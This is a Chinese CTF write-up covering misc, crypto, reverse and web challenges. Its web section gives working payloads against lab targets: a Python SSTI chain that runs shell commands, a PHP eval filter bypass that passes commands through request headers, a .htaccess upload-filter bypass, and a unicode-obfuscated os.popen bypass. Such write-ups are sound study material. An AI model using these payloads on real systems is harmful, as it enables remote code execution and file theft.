<h1 id="phG7y">Misc</h1>
<h2 id="wqmXu">签到</h2>
Base64解出ctf.ctf.vin，根据提示，DNS查询，找到<font style="color:#DF2A3F;">TXT</font>记录：

```python
flag{W3lc0m3_T0_NETDREAMCTF!!!!!}
```

<h2 id="Aa219">I AM K!</h2>
<h3 id="sxWPO">解法1</h3>
解法1是纯纯的脑洞musc，也是预期。本来想牢一下你们的，不曾想被非预期打烂了（（（

先看描述吧：

```python
B3F0re赵的立方体-1398441600
```

从这个描述中我们可以得到：

1. 通过搜索，赵的立方体是一个乐队，其后身(B3F0re)是**梅卡德尔**
2. 经过一把梭，这个数字是一个时间戳，其时间为**2014-04-26**

我们尝试搜索梅卡德尔与这个时间：

可以参考这个百科：[梅卡德尔简介](https://baike.baidu.com/item/%E6%A2%85%E5%8D%A1%E5%BE%B7%E5%B0%94%E4%B9%90%E9%98%9F/23326262)

定位到演艺经历与专辑：

```python
演艺经历
2013年11月21日发布6首Demo名为《梅卡德尔作品集》 [27]
2014年4月26日，发行首张专辑《梅卡德尔》。 [23]
2018年11月28日，发行第二张专辑《自我技术》。 [24]
2021年12月22日，发行第三张专辑《阿尔戈的荒岛》。 [25]
2022年6月18日，发布单曲专辑《癔症》。 [28]
2024年9月12日，发布第四章专辑《机器情人》。 [29]
2022年7月5日，成都草莓音乐节阵容官宣，梅卡德尔乐队加盟。 [7]8月27日、28日，参加2022长沙草莓音乐节。 [8]11月6日，参加第六届太湖湾音乐节。 [9]
```

```python
专辑
梅卡德尔
梅卡德尔
寻找多莉
狗女孩
我无法停止幻想
迷恋
我是K
死亡与堕落
过期
房间
乌鸦歌 [2-4]
```

可以看到这首歌与题目I AM K!相同，可以猜测我们需要得到的<font style="color:#DF2A3F;">key</font>就在这首歌中<font>(代码中给密文与加密逻辑了，只差一个key)</font>

搜索歌词得到如下内容

```python
我是A 在祖先的荣光下享受着意淫恩惠
我是A 是轰炸在边境上丧心病狂的雄伟
我是A 在无数的禁止瞬间里玩弄着慈悲
我是A 让莫名的欢乐在胜利中变得完美
用无序的表演来压抑 来释放
是自私 是疯狂 是甜蜜 是幻想
是灵魂 是解放 是控制 是欲望
是意识 是躲藏 是游戏 是死亡
是音乐 是无知 它告诉我 我就是K
我是K 我就是K
我是K 我才是K
```

回到加密脚本，可以看到密钥格式为<font style="color:#DF2A3F;">xx_xx_</font>，和<font style="color:#DF2A3F;">是自私 是疯狂…</font> 这段大差不差，也就是说去掉“是”字，然后把空格替换为_，就可以得到密钥，如下：

```python
key = "自私_疯狂_甜蜜_幻想_灵魂_解放_控制_欲望_意识_躲藏_游戏_死亡_音乐_无知"
```

密文已经给了：

```python
686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248
```

直接倒着推就好了

```python
import base64

def decrypt(ciphertext, key):
    key_sum = sum(ord(char) for char in key)
    caesar_shifted = bytes.fromhex(ciphertext).decode('utf-8')
    shift = key_sum % 26
    base64_encoded = ""
    for char in caesar_shifted:
        if char.isalpha():
            if char.isupper():
                shifted_char = chr(((ord(char) - ord('A') - shift) % 26 + ord('A')))
            else:
                shifted_char = chr(((ord(char) - ord('a') - shift) % 26 + ord('a')))
            base64_encoded += shifted_char
        else:
            base64_encoded += char
    encrypted_bytes = base64.b64decode(base64_encoded.encode('utf-8'))
    plaintext = ""
    for byte in encrypted_bytes:
        original_char = chr((byte - key_sum) % 256)
        plaintext += original_char
    
    return plaintext

key = "自私_疯狂_甜蜜_幻想_灵魂_解放_控制_欲望_意识_躲藏_游戏_死亡_音乐_无知"

ciphertext = "686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248"

decrypted_text = decrypt(ciphertext, key)
print(decrypted_text)
#flag{I_am_K_hypocritical_K}
```

<h3 id="E2BBM">解法2</h3>
爆破keysum即可

```python
import base64

cipher_hex = "686545356839417466377a5266364133695a54556a376857696f6c4e67377a5166364248"

caesar_shifted = bytes.fromhex(cipher_hex).decode()

def caesar_decode(s, shift):
    out = ""
    for ch in s:
        if ch.isalpha():
            if ch.isupper():
                out += chr(((ord(ch) - ord('A') - shift) % 26) + ord('A'))
            else:
                out += chr(((ord(ch) - ord('a') - shift) % 26) + ord('a'))
        else:
            out += ch
    return out
for shift in range(26):
    base64_str = caesar_decode(caesar_shifted, shift)
    try:
        encrypted_bytes = base64.b64decode(base64_str)
    except Exception:
        continue
    for k in range(256):
        plaintext = "".join(chr((b - k) % 256) for b in encrypted_bytes)
        if "flag{" in plaintext:
            print(f"shift={shift}, key_sum mod 256={k} flag={plaintext}")

```

<h2 id="IChso">ezimg</h2>
先看图片，010editor分析：

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751885775207-1b84040f-a3fa-4d75-9404-2c94063b4a6e.png)

有两个base64，我们分别解码：

[https://www.bilibili.com/video/BV1GJ411x7h7/](https://www.bilibili.com/video/BV1GJ411x7h7/)

[https://docs.qq.com/doc/DZWxobHhmRW9pd09k](https://docs.qq.com/doc/DZWxobHhmRW9pd09k)

B站的url是瑞克摇，并非重要，重点看QQ文档：

进去直接全选复制，可以得到一个flag{114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r}和一个藏在奶龙大佛背后的aHR0cHM6Ly93d2duLmxhbnpvdWwuY29tL2kzcTR5MzBodWVmYQ==

解密得到[https://wwgn.lanzoul.com/i3q4y30huefa](https://wwgn.lanzoul.com/i3q4y30huefa)

上去直接下载这个源码

其实看不出什么名堂，但只要你往右移动就会看到一串代码：

```python
from cryptography.fernet import Fernet; import base64; key = base64.urlsafe_b64encode(b'flag{xxx}'[:32].ljust(32, b'\0')[:32]); cipher = Fernet(key); encrypted = cipher.encrypt(b'flag{xxxx}'); #c=gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s
```

很显然，这里的key就是刚刚的flag{114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r}，直接解出来就行。

```python
from cryptography.fernet import Fernet
import base64

key = b"flag{114514-1919810-B1ngF3i_1s_a_@mazing_0ld3r}"
key1 = base64.urlsafe_b64encode(key.ljust(32, b'\0')[:32])
key2 = Fernet(key1)
c = b"gAAAAABoa6KH5msX3aA5PUiSZq1Ubma9DvtpU9ywyijLEbfQYNl-hn5Q_4NlmpcAD2pNjq07KvMYd2R32Id_R_3iW5GZn3yKTBW5R_5jFI_307_S9oep0zE0dhZCf_XOymC2WQhB2_6s"
m = key2.decrypt(c).decode()
print(m)
#flag{Hu@ngD0w_L0v3s_M1sc_F0r3v3r!!!!!}
```

<h1 id="va6VE">Crypto </h1>
<h2 id="nF4ak">Quaternion Lock  </h2>
+ **求解离散对数**
+ K 是在 Fₚ[i](形如 a + b·i)的子群内生成的，阶为 **subgroup_order = 60480**，该阶是平滑数，可以直接暴力枚举或使用 Pohlig-Hellman 算法求解。
+ 计算出 r 使得 **h^(r * e) = Y**，从而求得 K = h^r。
+ **计算 K⁻¹**
+ 由于四元数的范数为非零数，其逆元可通过**四元数共轭除以范数**计算。
+ **解密密文 X**
+ 根据加密公式X=K⋅F⋅K−1
+  只需计算F=K−1⋅X⋅K

```python
def qmul(q1, q2, p):
    a1, b1, c1, d1 = q1
    a2, b2, c2, d2 = q2
    return (
        (a1*a2 - b1*b2 - c1*c2 - d1*d2) % p,
        (a1*b2 + b1*a2 + c1*d2 - d1*c2) % p,
        (a1*c2 - b1*d2 + c1*a2 + d1*b2) % p,
        (a1*d2 + b1*c2 - c1*b2 + d1*a2) % p
    )

def qinv(q, p):
    a, b, c, d = q
    n = (a*a + b*b + c*c + d*d) % p
    inv_n = pow(n, -1, p)
    return ((a * inv_n) % p, (-b * inv_n) % p, (-c * inv_n) % p, (-d * inv_n) % p)

def qpow(q, exp, p):
    result = (1, 0, 0, 0)
    base = q
    while exp:
        if exp & 1:
            result = qmul(result, base, p)
        base = qmul(base, base, p)
        exp //= 2
    return result
def decode_flag(F_q):
    a, b, c, d = F_q
    parts = []
    parts.append(a.to_bytes(8, 'big'))
    parts.append(b.to_bytes(7, 'big'))
    parts.append(c.to_bytes(7, 'big'))
    parts.append(d.to_bytes(7, 'big'))
    flag_bytes = b"".join(parts)
    return flag_bytes.decode().rstrip('\x00')

def main():
    p = 9223372036854775783
    e = 65537
    X = (7380380986429696832, 34163292457091182, 3636630423226195928, 3896730209645707435)
    Y = (1015918725738180802, 4456058114364993854, 0, 0)

    subgroup_order = 60480
    # 计算子群生成元 h = g^((p^2 - 1) // subgroup_order)，其中 g = (2,1,0,0)
    g = (2, 1, 0, 0)
    h = qpow(g, ((p * p - 1) // subgroup_order), p)

    # 离散对数求解：寻找整数 r 满足 h^(r*e) = Y
    target = Y
    found_r = None
    for r in range(subgroup_order):
        if qpow(h, r * e, p) == target:
            found_r = r
            break
    print("r=", found_r)

    # 由此恢复 K = h^r
    K = qpow(h, found_r, p)
    # 计算 K⁻¹
    K_inv = qinv(K, p)
    # 利用四元数共轭还原 F：F = K⁻¹ * X * K
    F_q = qmul(K_inv, qmul(X, K, p), p)
    flag = decode_flag(F_q)
    print(flag)

if __name__ == "__main__":
    main()
#flag{0k@y_U_C@n_F1n1sh_iT!!!}
```



<h2 id="gxkFy">EzRSA</h2>
费马分解

```python
n = 3256593900815599638610948588846270419272266309072355018531019815816383416972716648196614202756266923662468043040766972587895880348728177684427108179441398076920699534139836200520410133083399544975367893285080239622582380507397956076038256757810824984700446326253944197017126171652309637891515864542581815539
c = 1668144786169714702301094076704686642891065952249900945234348491495868262367689770718451252978033214169821458376529832891775500377565608075759008139982766645172498702491199793075638838575243018129218596030822468832530007275522627172632933

def integer_cube_root(x: int) -> int:
    lo, hi = 0, 1 << ((x.bit_length() + 2) // 3)
    while lo <= hi:
        mid = (lo + hi) // 2
        m3 = mid * mid * mid
        if m3 == x:
            return mid
        if m3 < x:
            lo = mid + 1
        else:
            hi = mid - 1
    return hi

def main():
    m = integer_cube_root(c)
    length = (m.bit_length() + 7) // 8
    flag_bytes = m.to_bytes(length, byteorder='big')
    flag = flag_bytes.decode('utf-8')
    print(flag)

if __name__ == "__main__":
    main()
#flag{EZ_3Z++==+__U_C@n_F1n1sh_1t}
```



<h1 id="W4cox">Reverse</h1>
<h2 id="vGHX2">Ezre</h2>
查壳，有upx：

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751979809295-2bb7c417-74c5-406f-ade4-2d3a1adcbdd9.png)

upx-d一把梭

```python
EzRe> .\upx.exe -d .\ezre.exe
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.1       Markus Oberhumer, Laszlo Molnar & John Reiser    May 6th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: .\ezre.exe: CantUnpackException: file is modified/hacked/protected; take care!!!

Unpacked 0 files.
```

010editor打开：

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751979884690-e5a19cb3-da04-4bf6-9cc3-2fcb301c7e9e.png)

把所有SXC改成UPX即可正常脱壳。

flag最后会这么处理：

```python
enc[i] = ROL((c ^ key[i%5]), 3)
```

右循环移位3位+异或就好了

```python
enc = [
    0x3B, 0x73, 0x13, 0x1B, 0xF3, 0x81, 0x81, 0x81, 0x0B, 0x89,
    0xA1, 0xA1, 0xA1, 0x49, 0x03, 0xC9, 0xD9, 0x0B, 0x49, 0xA1,
    0x99, 0x33, 0x81, 0x49, 0x23, 0xA9, 0xB9, 0xA9, 0x49, 0x89,
    0x99, 0xA1, 0xA9, 0xA9, 0x89, 0x81, 0xA9, 0xB9, 0xA1, 0xA9,
    0x89, 0xFB
]
key = [0x01, 0x02, 0x03, 0x04, 0x05]

def ror8(x, r):
    return ((x >> r) | ((x << (8 - r)) & 0xFF)) & 0xFF

plain = []
for i, v in enumerate(enc):
    c = ror8(v, 3) ^ key[i % len(key)]
    plain.append(chr(c))

flag = "".join(plain)
print(flag)
#flag{123e4567-e89b-12d3-a456-426614174000}
```

<h2 id="O8BxC">NMTZ_LIKE_RE</h2>
稍微debug一下就可以知道写了反调试，shift+f12：

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1742723940638-9425e6b2-a071-43f0-9ac5-a3b44dd81aac.png)

可以看到反调试在这块，或者可以看函数，有<font style="color:#DF2A3F;">anti_debug</font>这个函数

```python
BOOL anti_debug()
{
  HANDLE CurrentProcess; // rax
  HMODULE ModuleHandleA; // rax
  HANDLE v2; // rax
  HANDLE CurrentThread; // rax
  int v5; // [rsp+3Ch] [rbp-44h] BYREF
  _CONTEXT Context; // [rsp+40h] [rbp-40h] BYREF
  int v7; // [rsp+514h] [rbp+494h] BYREF
  HWND hWnd; // [rsp+518h] [rbp+498h]
  FARPROC ProcAddress; // [rsp+528h] [rbp+4A8h]

  if ( IsDebuggerPresent() )
  {
    puts("Debugger detected! Exiting...");
    exit(1);
  }
  v7 = 0;
  CurrentProcess = GetCurrentProcess();
  _IAT_start__(CurrentProcess, &v7);
  if ( v7 )
  {
    puts("Remote Debugger detected! Exiting...");
    exit(1);
  }
  ModuleHandleA = GetModuleHandleA("ntdll.dll");
  ProcAddress = GetProcAddress(ModuleHandleA, "NtQueryInformationProcess");
  if ( ProcAddress )
  {
    v5 = 0;
    v2 = GetCurrentProcess();
    if ( !((unsigned int (__fastcall *)(HANDLE, __int64, int *, __int64, _QWORD))ProcAddress)(v2, 7LL, &v5, 4LL, 0LL) )
    {
      if ( v5 )
      {
        puts("Debugger detected via NtQueryInformationProcess! Exiting...");
        exit(1);
      }
    }
  }
  memset(&Context, 0, sizeof(Context));
  Context.ContextFlags = 1048592;
  CurrentThread = GetCurrentThread();
  if ( GetThreadContext(CurrentThread, &Context)
    && (Context.Dr0 || Context.Dr1 || Context.Dr2 || Context.Dr3 || Context.Dr6 || Context.Dr7) )
  {
    puts("Debugger detected via Debug Registers! Exiting...");
    exit(1);
  }
  hWnd = GetConsoleWindow();
  return ShowWindow(hWnd, 0);
}
```

根据这段，可知，此程序使用了以下方式来进行反调试

`**IsDebuggerPresent()**`** —— 检测是否被调试**

`**CheckRemoteDebuggerPresent()**`** —— 检测是否有远程调试器**

`**NtQueryInformationProcess()**`** —— 检测 **`**ProcessDebugPort**`

**调试寄存器 (**`**Dr0-Dr7**`**) 检测**

**隐藏窗口 (**`**ShowWindow(SW_HIDE)**`**)**

<h3 id="nWmpY">**解法1**</h3>
<font>直接nop掉anti_debug这个函数，动态调试后flag自显示</font>

<font></font>

<h3 id="jHZx9"><font>解法2</font></h3>
我们来到[https://dogbolt.org/](https://dogbolt.org/)，上传文件后拿到完整详细的伪代码(一千多行，这里就不放出来了)

以[<font>BinaryNinja</font>](https://binary.ninja/)<font>结果为例子：</font>

<font>他的var_48是密文，稍微异或下就好了</font>

```python
var_48 = bytes.fromhex("f8d0e09840b7785ad86f72e8772807b8e8478ae07288f07fc862e8af578a088a9080e0df8fa77a7850")

def ror(n, shift):
    return ((n >> shift) | ((n << (8 - shift)) & 0xff)) & 0xff

flag = []
for i in range(len(var_48)):
    temp = (var_48[i] - 0x17) & 0xff
    r = ror(temp, 3)
    xor = r ^ 0x5A
    final = (xor - (i % 5)) % 256
    flag.append(final)

print(bytes(flag).decode().strip('\x00'))
#flag{Nu0_M1_Tu@n_Z1_1s_Th3_GO0d3st_CTF3r}
```



<h1 id="JnGTW">Web</h1>
<h2 id="J46Lu">ezpython</h2>
<h3 id="S8gDr">Step1</h3>
拿到环境看f12，展开head：

```python
<html><head>
        <title></title>
        <!-- 下一关路径：/s3c0nd -->
    </head>
    <body>
    </body></html>
```

<h3 id="Nor9O">Step2</h3>
看内容就行了

```python
only fuzz(number)
```

爆破一下路径，拿到<font style="color:#DF2A3F;">114514</font>

<h3 id="qX7Tn">Step3</h3>
```python
你好 guest！
```

明显ssti注入，甚至手fuzz就能出，不过注释中有提示：

```python
<html><head>
        <title>野兽先辈の住所</title>
    </head>
    <body>
        <h1>你好 guest！</h1>
        <!-- 听说访问该页面的某get参数的某个数值可以爆源码 -->
    </body></html>
```

<font style="color:#DF2A3F;">arjun</font>爆破，出来一个<font style="color:#DF2A3F;">source</font>一个<font style="color:#DF2A3F;">name</font><font>，其实一般来说拿到name就知道ssti注入了。爆破source的参数拿到</font><font style="color:#DF2A3F;">?source=6969</font>，访问后出源码

无任何过滤的ssti注入，直接传如下payload：

```python
?name={{ ''.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(232).__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()') }}
```



<h2 id="eHX5J">ezbypass</h2>
源码如下：

```python
<?php

$test=$_GET['test'];

if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\|implode|phpinfo|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|session_id|session_start|echo|readfile|highlight|show|source|file|assert/i", $test)){
    eval($test);
}
else{
    echo "oh nonono hacker!";
}

highlight_file(__FILE__);
```

乍一看他把能过滤的都过滤了，其实漏掉了**<font style="color:#DF2A3F;">system</font>**和**<font style="color:#DF2A3F;">apache_request_headers</font>**

apache_request_headers这个函数有可能有点冷门，其实它是<font style="color:#DF2A3F;">getallheaders</font><font>的别名，详见</font>[php手册](https://www.php.net/manual/en/function.getallheaders.php)

同时，这道题也过滤了<font style="color:#DF2A3F;">imlode</font>，其别名<font style="color:#DF2A3F;">join</font>可以正常使用

我们直接发payload：

```python
GET /index.php?test=system(join(apache_request_headers())); HTTP/1.1
Host: x.x.x.x
cmd: echo$IFS`cat /flag`>1.txt;
```

<h2 id="BB4lh">ezupload</h2>
过滤了php和htaccess后缀，但他只会直接删除文件名中的字符，但是不拦截上传的文件![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751602927552-1e34ca27-5d82-48a2-8203-01fc027d9b6f.png)

 不难发现，当上传⽂件名为1.htaccess1htaccess2htaccess3时 经过过滤，只剩下1.123  

 那么我们可以利⽤过滤来拼接⼀个完整的⽂件名 先尝试套两层 htaccesshtahtaccessccess  

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751602963213-ef938c6d-1598-405c-b3f6-1e33924243f0.png)

 对修改后的⽂件名⼆次过滤，依旧删除了拼接得到的htaccess，由于.htaccesshtahtaccessccess被过滤 了，只剩.号，⽂件名不合法，因此被重命名了  

再多套一层

 htaccesshtahtaccessccesshtahtaccesshtahtaccessccessccess  

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751602992062-643de216-3e35-4642-8be6-ba9a708bbd0b.png)

上传成功

php标签被过滤，可以直接使⽤htaccess包含flag⽂件  ，当然这里也可以用长标签来绕过

```php
AddType application/x-httpd-php .jpg
  php_value auto_append_fi\
  le "/flag"
```

 上传此htaccess后，随便上传个jpg⽂件，然后访问， 当然，你也可以像这样传php，a.ppphphpphphp

![](https://cdn.nlark.com/yuque/0/2025/png/42686343/1751603071911-1f478d75-333c-4dc1-b45e-59951f9829ba.png)



<h2 id="Bk3oT">Pickle♥dill</h2>
<font>有三个解法的</font>

<font></font>

<font>1. 可以unicode去绕，直接RCE读源码文件里面的flag（预期）（纯web）</font>

<font>2. 可以用官方文档里的get函数，上传{{get('chal')}}（预期）然后inspect手撕dill （web+misc）</font>

<font>3. 可以用{{chal}}（我错了我这就进厂别骂了）然后手撕dill （web+misc）</font>

<h3 id="vdUdY"><font>解法1</font></h3>
unicode绕过直接读源码文件拿到flag。具体参考XYCTF 2025 出题人已疯

```python
__impºrt__('os').pºpen('cat app.py').reªd()
```

<h3 id="mLcGW"><font>解法2</font></h3>
<font>明显的文件上传+渲染。拿到chal变量就行。</font>

<font>这里所有的builtins和magic method被waf了。所以考虑使用bottle原生的模板函数get()</font>

<font>上传{{get('chal')}}</font>

<font>返回：</font>

```plain
The content is: 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
```

<font>开个dill反序列化看一下object：</font>

```plain
import dill
import base64
from objdbg import dbg
a = dill.loads(base64.b64decode('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